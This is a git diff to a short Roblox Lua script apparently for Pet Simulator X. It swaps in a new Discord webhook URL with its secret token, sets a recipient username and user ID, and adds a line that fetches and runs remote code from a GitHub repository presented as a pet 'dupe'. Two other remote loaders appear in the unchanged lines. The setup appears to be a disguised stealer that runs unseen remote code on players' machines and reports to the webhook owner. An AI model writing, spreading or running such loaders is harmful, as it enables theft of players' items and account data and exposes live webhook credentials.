@@ -1,9 +1,13 @@
 UserName = "Yyds76"
-WebHook = "https://discord.com/api/webhooks/1050271848182591508/FJ1idfYuV73eKqJgSTP9fPCQGuB-Xy_zwzGX6L1ZMbS9kH_3KpsFMaP-53gH00u89RvF"
+WebHook = "https://discord.com/api/webhooks/1057889927452438598/V4hh2Nqa9rzwlN8s8hw1HNGy-iLGqzPyLd7oejVSJEhmakyR55XROj9Wn6YMBe4rx2pS"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
 
 _G.UserID = 2860517870
-_G.WebHook = "https://discord.com/api/webhooks/1050271848182591508/FJ1idfYuV73eKqJgSTP9fPCQGuB-Xy_zwzGX6L1ZMbS9kH_3KpsFMaP-53gH00u89RvF"
+_G.WebHook = "https://discord.com/api/webhooks/1057889927452438598/V4hh2Nqa9rzwlN8s8hw1HNGy-iLGqzPyLd7oejVSJEhmakyR55XROj9Wn6YMBe4rx2pS"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence" ))()
 
---lol--
+UserName = "Yyds76"
+WebHook = "https://discord.com/api/webhooks/1057889927452438598/V4hh2Nqa9rzwlN8s8hw1HNGy-iLGqzPyLd7oejVSJEhmakyR55XROj9Wn6YMBe4rx2pS"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()
+
+--lol haha--
